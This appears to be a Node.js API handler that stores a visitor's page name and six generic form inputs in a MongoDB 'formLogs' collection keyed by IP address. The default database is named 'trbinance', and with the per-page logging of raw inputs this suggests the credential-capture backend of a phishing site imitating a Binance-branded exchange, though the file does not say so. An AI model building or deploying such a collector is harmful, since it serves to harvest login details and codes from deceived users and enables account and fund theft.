const clientPromise = require('../lib/mongo');

async function readBody(req) {
  const chunks = [];
  return new Promise((resolve, reject) => {
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString() || '{}';
        resolve(JSON.parse(raw));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const body = await readBody(req);
    const { page, inputs } = body || {};

    const ip = getClientIp(req);
    const now = new Date();

    const setFields = { updatedAt: now };

    if (page && typeof page === 'string') {
      setFields.page = page.slice(0, 120);
    }

    if (inputs && typeof inputs === 'object') {
      for (let i = 1; i <= 6; i += 1) {
        const key = `input${i}`;
        if (Object.prototype.hasOwnProperty.call(inputs, key)) {
          const value = inputs[key];
          setFields[key] =
            value !== undefined && value !== null ? String(value).slice(0, 512) : '';
        }
      }
    }

    if (Object.keys(setFields).length === 1) {
      return res.status(400).json({ error: 'Nothing to update' });
    }

    const client = await clientPromise;
    const db = client.db(process.env.MONGODB_DB || 'trbinance');
    const logs = db.collection('formLogs');

    await logs.updateOne(
      { ip },
      {
        $set: setFields
      },
      { upsert: false }
    );

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Log page update error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};


